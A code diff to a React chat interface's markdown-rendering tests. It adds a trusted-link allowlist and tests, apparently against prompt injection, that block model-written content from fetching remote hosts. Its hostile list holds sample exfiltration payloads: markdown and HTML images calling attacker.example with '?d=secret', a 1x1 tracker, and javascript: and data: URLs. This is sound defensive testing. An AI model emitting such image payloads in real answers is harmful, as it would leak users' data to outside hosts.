@@ -23,11 +23,12 @@ function scriptedAdapter(reply: string, pauseAfterYieldMs = 0): ChatModelAdapter
   };
 }
 
-function Harness({ reply, preprocess, pauseAfterYieldMs, remend }: { reply: string; preprocess?: (text: string, context: { streaming: boolean }) => string; pauseAfterYieldMs?: number; remend?: RemendConfig }) {
+function Harness({ reply, preprocess, pauseAfterYieldMs, remend, trustedLinks }: { reply: string; preprocess?: (text: string, context: { streaming: boolean }) => string; pauseAfterYieldMs?: number; remend?: RemendConfig; trustedLinks?: readonly string[] }) {
   const runtime = useLocalRuntime(scriptedAdapter(reply, pauseAfterYieldMs));
+  const markdown = preprocess || remend || trustedLinks ? { markdown: { preprocess, remend, trustedLinks } } : undefined;
   return (
     <AssistantRuntimeProvider runtime={runtime}>
-      <Thread components={preprocess || remend ? { markdown: { preprocess, remend } } : undefined} />
+      <Thread components={markdown} />
     </AssistantRuntimeProvider>
   );
 }
@@ -251,16 +252,111 @@ describe("markdown-text.tsx: rich content wiring (CHAT-RICH-01)", () => {
     expect(container.textContent).toContain("$7");
   });
 
-  test("an inline link never opens in the current tab", async () => {
+  test("an unlisted inline link renders as visible text", async () => {
     const reply = "see [this site](https://example.com/page) for more";
     const { container, getByRole } = render(<Harness reply={reply} />);
     await sendAndSettle(container, getByRole);
 
-    const link = container.querySelector('a[href="https://example.com/page"]');
+    expect(container.querySelector('a[href="https://example.com/page"]')).toBeNull();
+    expect(container.textContent).toContain("https://example.com/page");
+  });
+
+  test("a trusted URL prefix does not trust a different URL with a longer suffix", async () => {
+    const { container, getByRole } = render(
+      <Harness reply="[listed](https://example.com/page) [lookalike](https://example.com/page.evil)" trustedLinks={["https://example.com/page"]} />,
+    );
+    await sendAndSettle(container, getByRole);
+    expect(container.querySelector('a[href="https://example.com/page"]')).not.toBeNull();
+    expect(container.querySelector('a[href="https://example.com/page.evil"]')).toBeNull();
+    expect(container.textContent).toContain("https://example.com/page.evil");
+  });
+
+  test("an exact trusted URL stays a no-referrer link", async () => {
+    const url = "https://example.com/page";
+    const { container, getByRole } = render(<Harness reply={`see [this site](${url})`} trustedLinks={[url]} />);
+    await sendAndSettle(container, getByRole);
+
+    const link = container.querySelector(`a[href="${url}"]`);
     expect(link).not.toBeNull();
     expect(link!.getAttribute("target")).toBe("_blank");
     expect(link!.getAttribute("rel")).toBe("noopener noreferrer");
     expect(link!.getAttribute("referrerpolicy")).toBe("no-referrer");
-    expect(container.querySelector('[role="dialog"]')).toBeNull();
+  });
+
+  // PI-RENDER-01 (F1): a model-written image must never make the browser fetch
+  // a remote host. Asserted on the DOM: no <img>/<source>/<iframe>/<object>
+  // whose address is anything but a hub-own proxy path.
+  const hostile: Array<[string, string]> = [
+    ["a remote markdown image", "before ![x](https://attacker.example/?d=secret) after"],
+    ["an HTML img", 'before <img src="https://attacker.example/p.gif"> after'],
+    ["a reference-style image", "before ![x][r] after\n\n[r]: https://attacker.example/?d=secret"],
+    ["a non-image data URL", "before ![x](data:text/html,alert(1)) after"],
+    ["a protocol-relative image", "before ![x](//attacker.example/p.gif) after"],
+    ["a 1x1 tracker", "before ![](https://t.attacker.example/1x1.gif?u=abc) after"],
+    ["a javascript: image", "before ![x](javascript:alert(1)) after"],
+  ];
+  const fetchable = (container: HTMLElement) =>
+    Array.from(container.querySelectorAll("[src], [srcset], object[data]")).filter((el) => {
+      const v = el.getAttribute("src") ?? el.getAttribute("srcset") ?? el.getAttribute("data") ?? "";
+      return !v.startsWith("/api/answer-image/");
+    });
+
+  for (const [name, reply] of hostile) {
+    test(`PI-RENDER-01: ${name} fetches nothing and shows a blocked placeholder (stored)`, async () => {
+      const { container, getByRole } = render(<Harness reply={reply} />);
+      await sendAndSettle(container, getByRole);
+      const md = container.querySelector(".aui-md")!;
+      expect(fetchable(md as HTMLElement)).toEqual([]);
+      expect(md.textContent).toContain("before");
+      expect(md.textContent).toContain("after");
+    });
+    test(`PI-RENDER-01: ${name} fetches nothing while streaming`, async () => {
+      const { container, getByRole } = render(<Harness reply={reply} pauseAfterYieldMs={400} />);
+      await sendAndSettle(container, getByRole);
+      expect(container.querySelector('[data-status="running"]')).toBeTruthy();
+      expect(fetchable(container.querySelector(".aui-md") as HTMLElement)).toEqual([]);
+    });
+  }
+
+  test("PI-RENDER-01: a blocked remote image says so and keeps the alt text", async () => {
+    const { container, getByRole } = render(<Harness reply="![a red barn](https://attacker.example/?d=x)" />);
+    await sendAndSettle(container, getByRole);
+    const md = container.querySelector(".aui-md")!;
+    expect(md.textContent).toContain("a red barn");
+    expect(md.textContent).toContain("Image blocked");
+    expect(md.textContent).not.toContain("attacker.example");
+  });
+
+  test("PI-RENDER-01: a hub proxy image still renders", async () => {
+    const { container, getByRole } = render(<Harness reply="![barn](/api/answer-image/abc123)" />);
+    await sendAndSettle(container, getByRole);
+    const img = container.querySelector(".aui-md img");
+    expect(img?.getAttribute("src")).toBe("/api/answer-image/abc123");
+  });
+
+  test("PI-RENDER-01: model data and blob images are blocked at the renderer", async () => {
+    const dataUrl = "data:image/png;base64,iVBORw0KGgo=";
+    const blobUrl = "blob:http://localhost/1234";
+    const { container, getByRole } = render(<Harness reply={`![local](${dataUrl}) ![preview](${blobUrl})`} />);
+    await sendAndSettle(container, getByRole);
+    expect(container.querySelector(`img[src="${dataUrl}"]`)).toBeNull();
+    expect(container.querySelector(`img[src="${blobUrl}"]`)).toBeNull();
+  });
+
+  test("PI-RENDER-01: a javascript: link is never an href", async () => {
+    const { container, getByRole } = render(<Harness reply="[click](javascript:alert(1))" />);
+    await sendAndSettle(container, getByRole);
+    const hrefs = Array.from(container.querySelectorAll(".aui-md a")).map((a) => a.getAttribute("href") ?? "");
+    expect(hrefs.some((h) => h.toLowerCase().startsWith("javascript:"))).toBe(false);
+  });
+
+  test("PI-RENDER-01: a normal link still works and shows its full address", async () => {
+    const url = "https://example.com/page?q=1";
+    const { container, getByRole } = render(<Harness reply={`see [this](${url}) now`} trustedLinks={[url]} />);
+    await sendAndSettle(container, getByRole);
+    const link = container.querySelector('.aui-md a[href="https://example.com/page?q=1"]')!;
+    expect(link).not.toBeNull();
+    expect(link.getAttribute("title")).toBe("https://example.com/page?q=1");
+    expect(link.getAttribute("rel")).toBe("noopener noreferrer");
   });
 });
